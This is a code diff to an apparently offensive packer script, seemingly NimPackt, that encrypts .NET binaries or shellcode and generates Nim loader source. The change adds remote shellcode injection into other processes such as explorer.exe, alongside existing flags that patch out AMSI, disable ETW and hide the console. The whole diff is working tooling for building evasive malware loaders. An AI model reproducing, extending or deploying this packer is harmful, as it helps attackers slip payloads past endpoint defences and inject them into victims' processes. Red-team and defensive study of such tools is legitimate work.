@@ -126,7 +126,6 @@ def generateSource_ExecuteAssembly(fileName, cryptedInput, cryptIV, cryptKey, ar
                 new_line = new_line.replace('#[ PLACEHOLDERARGUMENTS ]#', argString)
                 result += new_line +"\n"
 
-    # Get output directory and name. Unfortunately nim does not allow hyphens or periods in the output file :/
     outDir = "./output/"
     outFilename = outDir + os.path.splitext(os.path.basename(fileName))[0].replace('-', '') + "ExecAssemblyNimPackt.nim"
 
@@ -155,9 +154,37 @@ def generateSource_Shinject(fileName, cryptedInput, cryptIV, cryptKey, disableAm
                 new_line = new_line.replace('#[ PLACEHOLDERCRYPTIV ]#', cryptIV)
                 result += new_line +"\n"
 
-    # Get output directory and name. Unfortunately nim does not allow hyphens or periods in the output file :/
     outDir = "./output/"
     outFilename = outDir + os.path.splitext(os.path.basename(fileName))[0].replace('-', '') + "ShinjectNimPackt.nim"
+
+    if not os.path.exists(outDir):
+        os.makedirs(outDir)
+
+    with open(outFilename, 'w') as outFile:
+        outFile.write(result)
+        print("Prepared Nim source file.")
+
+    return outFilename
+
+def generateSource_RemoteShinject(fileName, cryptedInput, cryptIV, cryptKey, disableAmsi, disableEtw, verbose, injecttarget, existingprocess):
+    # Construct the Nim source file based on the passed arguments, using the Execute-Assembly template 
+    filenames = ["NimPackt-Template-Base.nim", "NimPackt-Template-RemoteShinject.nim"]
+    result = ""
+    for fname in filenames:
+        with open(fname,'r') as templateFile:
+            for line in templateFile:
+                new_line = line.rstrip()
+                new_line = new_line.replace('#[ PLACEHOLDERCRYPTKEY ]#', cryptKey)
+                new_line = new_line.replace('#[ PLACEHOLDERVERBOSE ]#', f"let verbose = {str(verbose).lower()}")
+                new_line = new_line.replace('#[ PLACEHOLDERPATCHAMSI ]#', f"let optionPatchAmsi = {str(disableAmsi).lower()}")
+                new_line = new_line.replace('#[ PLACEHOLDERDISABLEETW ]#', f"let optionDisableEtw = {str(disableEtw).lower()}")
+                new_line = new_line.replace('#[ PLACEHOLDERCRYPTEDINPUT ]#', cryptedInput)
+                new_line = new_line.replace('#[ PLACEHOLDERCRYPTIV ]#', cryptIV)
+                new_line = new_line.replace('#[ PLACEHOLDERINJECTCALL ]#', f"injectShellcodeRemote(decoded, \"{injecttarget}\", {str(existingprocess).lower()})")
+                result += new_line +"\n"
+
+    outDir = "./output/"
+    outFilename = outDir + os.path.splitext(os.path.basename(fileName))[0].replace('-', '') + "RemoteShinjectNimPackt.nim"
 
     if not os.path.exists(outDir):
         os.makedirs(outDir)
@@ -202,11 +229,16 @@ if __name__ == "__main__":
     parser = argparse.ArgumentParser()
     parser._action_groups.pop()
     required = parser.add_argument_group('required arguments')
-    optional = parser.add_argument_group('optional arguments')
+    assembly = parser.add_argument_group('execute-assembly arguments')
+    injection = parser.add_argument_group('shinject arguments')
+    optional = parser.add_argument_group('other arguments')
 
+    required.add_argument('-e', '--executionmode', action='store', dest='executionmode', help='Execution mode of the packer. Supports "execute-assembly" or "shinject"', required=True)
     required.add_argument('-i', '--inputfile', action='store', dest='inputfile', help='C# .NET binary executable (.exe) or shellcode (.bin) to wrap', required=True)
-    optional.add_argument('-a', '--arguments', action='store', dest='arguments', default="PASSTHRU", nargs="?", const="", help='Arguments to "bake into" the wrapped binary, or "PASSTHRU" to accept run-time arguments (default)')
-    optional.add_argument('-e', '--executionmode', action='store', dest='executionmode', default="execute-assembly", help='Execution mode of the packer. Supports "execute-assembly" (default), "shinject", "shinject-remote" (TODO)')
+    assembly.add_argument('-a', '--arguments', action='store', dest='arguments', default="PASSTHRU", nargs="?", const="", help='Arguments to "bake into" the wrapped binary, or "PASSTHRU" to accept run-time arguments (default)')
+    injection.add_argument('-r', '--remote', action='store_false', dest='localinject', default=True, help='Inject shellcode into remote process (default false)')
+    injection.add_argument('-t', '--target', action='store', dest='injecttarget', default="explorer.exe", help='Remote thread targeted for remote process injection (default "explorer.exe", implies -r)')
+    injection.add_argument('-E', '--existing', action='store_true', dest='existingprocess', default=False, help='Remote inject into existing process rather than a newly spawned one (default false, implies -r) (WARNING: VOLATILE)')
     optional.add_argument('-32', '--32bit', action='store_false', default=True, dest='x64', help='Compile in 32-bit mode')
     optional.add_argument('-H', '--hideapp', action='store_true', default=False, dest='hideApp', help='Hide the app frontend (console output) by compiling it in GUI mode')
     optional.add_argument('-na', '--nopatchamsi', action='store_false', default=True, dest='patchAmsi', help='Do NOT patch (disable) the Anti-Malware Scan Interface (AMSI)')
@@ -216,14 +248,20 @@ if __name__ == "__main__":
 
     args = parser.parse_args()
 
+    if args.executionmode == "shinject" and args.arguments not in ["", "PASSTHRU"]:
+        print("WARNING: Execute-assembly arguments (-a) will be ignored in 'shinject' mode.")
+
+    if args.executionmode == "execute-assembly" and (args.localinject == False or args.injecttarget != "explorer.exe" or args.existingprocess == True):
+        print("WARNING: Shinject arguments (-r, -t, and -E) will be ignored in 'execute-assembly' mode.")
+
+    if args.executionmode == "shinject" and args.existingprocess == True:
+        print("WARNING: ⚠ Injecting into existing processes is VERY volatile and is likely to CRASH the target process in its current state. DO NOT USE IN PRODUCTION ⚠")
+
     if args.x64 == False:
         print("WARNING: Compiling in x86 mode may cause crashes. Compile generated .nim file manually in this case.")
 
-    if args.executionmode in ["shinject-remote"]:
-        raise SystemExit("ERROR: Sorry, remote shellcode injection is not supported yet. Coming Soon™️")
-
-    if args.executionmode in ["shinject", "shinject-remote"] and args.arguments not in ["", "PASSTHRU"]:
-        print("WARNING: Arguments will be ignored in shellcode mode.")
+    if args.executionmode == "shinject" and (args.injecttarget != "explorer.exe" or args.existingprocess == True):
+        args.localinject = False
 
     cryptedInput, cryptIV, cryptKey = aesEncryptInputFile(args.inputfile)
 
@@ -232,9 +270,12 @@ if __name__ == "__main__":
     if args.executionmode == "execute-assembly":
         sourceFile = generateSource_ExecuteAssembly(args.inputfile, cryptedInput, cryptIV, cryptKey,
             argString, args.patchAmsi, args.disableEtw, args.verbose)
-    elif args.executionmode == "shinject":
+    elif args.executionmode == "shinject" and args.localinject == True:
         sourceFile = generateSource_Shinject(args.inputfile, cryptedInput, cryptIV, cryptKey,
             args.patchAmsi, args.disableEtw, args.verbose)
+    elif args.executionmode == "shinject" and args.localinject == False:
+        sourceFile = generateSource_RemoteShinject(args.inputfile, cryptedInput, cryptIV, cryptKey,
+            args.patchAmsi, args.disableEtw, args.verbose, args.injecttarget, args.existingprocess)
     else:
         raise SystemExit("ERROR: Argument 'executionmode' is not valid. Please specify either of 'execute-assembly', 'shinject', or 'shinject-remote'.")
 
